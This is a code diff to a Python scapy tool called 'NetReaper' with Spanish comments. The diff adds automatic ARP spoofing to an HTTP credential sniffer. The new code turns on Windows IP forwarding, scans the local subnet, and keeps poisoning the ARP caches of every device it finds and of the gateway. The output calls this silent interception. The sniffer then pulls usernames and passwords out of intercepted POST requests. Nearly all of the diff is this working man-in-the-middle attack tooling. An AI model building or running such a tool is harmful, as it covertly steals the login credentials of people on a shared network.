@@ -1,4 +1,4 @@
-from scapy.all import sniff, IP, TCP, Raw, IFACES
+from scapy.all import sniff, IP, TCP, Raw, IFACES, ARP, Ether, sendp, srp, get_if_hwaddr
 from urllib.parse import unquote_plus
 import re
 import socket
@@ -13,8 +13,11 @@ KEYWORDS = ["username", "user", "email", "login",
 CAMPOS_USUARIO = ["user", "username", "user_login", "email", "login", "uname", "usr"]
 CAMPOS_PASS    = ["password", "pass", "passwd", "pwd", "user_password", "passw"]
 
+# Set para evitar imprimir capturas duplicadas (por retransmisiones TCP)
+paquetes_procesados = set()
 
 def procesar_paquete(paquete):
+    global paquetes_procesados
     if not (paquete.haslayer(TCP) and paquete.haslayer(Raw)):
         return
 
@@ -60,6 +63,16 @@ def procesar_paquete(paquete):
     # Identificar usuario y password
     usuario  = next((campos[c] for c in CAMPOS_USUARIO if c in campos), None)
     password = next((campos[c] for c in CAMPOS_PASS    if c in campos), None)
+
+    # Crear una "firma" de la petición para evitar duplicados
+    firma = f"{src_ip}-{dst_ip}-{host}-{body}"
+    if firma in paquetes_procesados:
+        return
+    paquetes_procesados.add(firma)
+
+    # Limpiar el historial cada cierto tiempo para no llenar la RAM (si hay muchas)
+    if len(paquetes_procesados) > 500:
+        paquetes_procesados.clear()
 
     sep = "=" * 60
     print(f"\n{sep}")
@@ -122,24 +135,230 @@ def forzar_descubrimiento(mi_ip):
     print("[*] Descubrimiento completado. Iniciando sniffer...")
 
 
+def activar_ip_forwarding():
+    print("[*] Activando IP Forwarding (Reenvío de IP) en Windows...")
+    try:
+        # Intenta usar PowerShell
+        subprocess.call(
+            ["powershell", "-Command", "Set-NetIPInterface -Forwarding Enabled"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=0x08000000
+        )
+        # Respaldo: Cambiar la clave del registro
+        subprocess.call(
+            ["reg", "add", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", 
+             "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=0x08000000
+        )
+    except Exception:
+        pass
+
+
+def detectar_red_completa(mi_ip):
+    gateway = None
+    try:
+        resultado = subprocess.check_output("ipconfig", encoding="cp850", errors="ignore")
+        en_adaptador = False
+        for linea in resultado.splitlines():
+            if mi_ip in linea:
+                en_adaptador = True
+            if en_adaptador and ("Puerta de enlace" in linea or "Default Gateway" in linea):
+                partes = linea.split(":")
+                if len(partes) > 1:
+                    gw = partes[-1].strip()
+                    if gw and gw != "" and "." in gw:
+                        gateway = gw
+                        break
+    except Exception:
+        pass
+
+    if not gateway:
+        partes = mi_ip.split(".")
+        gateway = f"{partes[0]}.{partes[1]}.{partes[2]}.1"
+
+    partes = mi_ip.split(".")
+    rango = f"{partes[0]}.{partes[1]}.{partes[2]}.0/24"
+    return gateway, rango
+
+
+def leer_arp_windows(mi_ip, gateway):
+    try:
+        resultado = subprocess.check_output("arp -a", encoding="cp850", errors="ignore")
+        dispositivos = []
+        en_interfaz_correcta = False
+        
+        for linea in resultado.splitlines():
+            if mi_ip in linea and "Interfaz:" in linea:
+                en_interfaz_correcta = True
+                continue
+            
+            if "Interfaz:" in linea and mi_ip not in linea:
+                en_interfaz_correcta = False
+            
+            if not en_interfaz_correcta:
+                continue
+            
+            partes = linea.split()
+            if len(partes) >= 2:
+                ip = partes[0]
+                mac = partes[1].replace("-", ":")
+                
+                if (ip not in (gateway, mi_ip) 
+                    and not ip.startswith("224.") 
+                    and not ip.startswith("239.")
+                    and not ip.endswith(".255") 
+                    and "dinámico" in linea.lower()
+                    and mac != "ff:ff:ff:ff:ff:ff"):
+                    dispositivos.append({"ip": ip, "mac": mac})
+        return dispositivos
+    except Exception:
+        return []
+
+
+def obtener_mac(ip, interfaz):
+    for _ in range(3):
+        paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+        resp, _ = srp(paquete, iface=interfaz, timeout=5, verbose=False)
+        if resp:
+            return resp[0][1].hwsrc
+        time.sleep(0.5)
+    try:
+        resultado = subprocess.check_output("arp -a", encoding="cp850", errors="ignore")
+        for linea in resultado.splitlines():
+            if ip in linea and "dinámico" in linea.lower():
+                partes = linea.split()
+                if len(partes) >= 2 and partes[0] == ip:
+                    return partes[1].replace("-", ":")
+    except Exception:
+        pass
+    return None
+
+
+def escanear_red(rango, interfaz, mi_ip, gateway):
+    forzar_descubrimiento(mi_ip)
+    paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango)
+    respondidos, _ = srp(paquete, iface=interfaz, timeout=4, verbose=False)
+
+    dispositivos = []
+    ips_encontradas = set()
+    
+    for _, resp in respondidos:
+        ip  = resp[ARP].psrc
+        mac = resp[ARP].hwsrc
+        if ip in (gateway, mi_ip): continue
+        dispositivos.append({"ip": ip, "mac": mac})
+        ips_encontradas.add(ip)
+
+    dispositivos_windows = leer_arp_windows(mi_ip, gateway)
+    for dw in dispositivos_windows:
+        if dw["ip"] not in ips_encontradas:
+            dispositivos.append(dw)
+            ips_encontradas.add(dw["ip"])
+
+    return dispositivos
+
+
+def spoof(ip_objetivo, mac_objetivo, ip_suplantada, mi_mac, interfaz):
+    paquete = Ether(dst=mac_objetivo) / ARP(
+        op=2, pdst=ip_objetivo, hwdst=mac_objetivo,
+        psrc=ip_suplantada, hwsrc=mi_mac
+    )
+    sendp(paquete, iface=interfaz, verbose=False)
+
+
+def restaurar(dispositivos, gateway, mac_gateway, interfaz):
+    print("\n[*] Restaurando tablas ARP y apagando sniffer...")
+    for d in dispositivos:
+        p1 = Ether(dst=d["mac"]) / ARP(
+            op=2, pdst=d["ip"], hwdst=d["mac"],
+            psrc=gateway, hwsrc=mac_gateway
+        )
+        p2 = Ether(dst=mac_gateway) / ARP(
+            op=2, pdst=gateway, hwdst=mac_gateway,
+            psrc=d["ip"], hwsrc=d["mac"]
+        )
+        sendp([p1, p2], iface=interfaz, count=5, verbose=False)
+
+
+def hilo_interceptar_red(interfaz, mi_ip, gateway, rango):
+    mi_mac = get_if_hwaddr(interfaz)
+    print(f"[*] Preparando intercepción invisible (ARP Spoofing)...")
+    mac_gateway = obtener_mac(gateway, interfaz)
+    
+    if not mac_gateway:
+        print("[!] Fallo crítico: No se encontró el gateway.")
+        return
+
+    dispositivos = escanear_red(rango, interfaz, mi_ip, gateway)
+    if not dispositivos:
+        print("[!] No hay dispositivos para interceptar.")
+        return
+
+    print(f"[*] Interceptando tráfico de {len(dispositivos)} dispositivos silenciosamente.")
+    
+    ciclos = 0
+    try:
+        while True:
+            if ciclos % 30 == 0 and ciclos != 0:
+                nuevos = escanear_red(rango, interfaz, mi_ip, gateway)
+                ips_actuales = {d["ip"] for d in dispositivos}
+                for d in nuevos:
+                    if d["ip"] not in ips_actuales:
+                        dispositivos.append(d)
+                        print(f"\n    [+] Nuevo dispositivo interceptado: {d['ip']}")
+
+            for d in dispositivos:
+                spoof(d["ip"],  d["mac"],   gateway, mi_mac, interfaz)
+                spoof(gateway, mac_gateway, d["ip"], mi_mac, interfaz)
+
+            ciclos += 1
+            time.sleep(1.5)
+    except Exception:
+        restaurar(dispositivos, gateway, mac_gateway, interfaz)
+
+
 def main():
+    print("=" * 55)
+    print("       NETREAPER SNIFFER — MODO TOTALMENTE AUTOMATICO")
+    print("=" * 55)
+
     INTERFAZ, nombre, mi_ip = detectar_interfaz()
     if not INTERFAZ:
         print("[!] No se encontró una interfaz activa.")
         return
 
-    # Forzar descubrimiento para que la tabla ARP esté poblada
-    forzar_descubrimiento(mi_ip)
+    # 1. Habilitar el Forwarding de Windows para no cortar el internet
+    activar_ip_forwarding()
 
-    print(f"\n[*] Escuchando en {nombre} — puerto 80 (HTTP)")
-    print("[*] Esperando peticiones POST con credenciales...\n")
-
-    sniff(
-        iface=INTERFAZ,
-        filter="tcp port 80",
-        prn=procesar_paquete,
-        store=False
+    # 2. Descubrir la red
+    gateway, rango = detectar_red_completa(mi_ip)
+    
+    # 3. Lanzar el interceptor ARP (Ataque) en un hilo paralelo
+    t_interceptor = threading.Thread(
+        target=hilo_interceptar_red, 
+        args=(INTERFAZ, mi_ip, gateway, rango)
     )
+    t_interceptor.daemon = True
+    t_interceptor.start()
+
+    # Dar unos segundos para que el interceptor empiece
+    time.sleep(5)
+
+    print(f"\n[*] Todo listo. Escuchando en {nombre} — puerto 80 (HTTP)")
+    print("[*] Esperando pacientemente credenciales...\n")
+
+    try:
+        sniff(
+            iface=INTERFAZ,
+            filter="tcp port 80",
+            prn=procesar_paquete,
+            store=False
+        )
+    except KeyboardInterrupt:
+        print("\n[*] Saliendo de NetReaper...")
 
 
 if __name__ == "__main__":
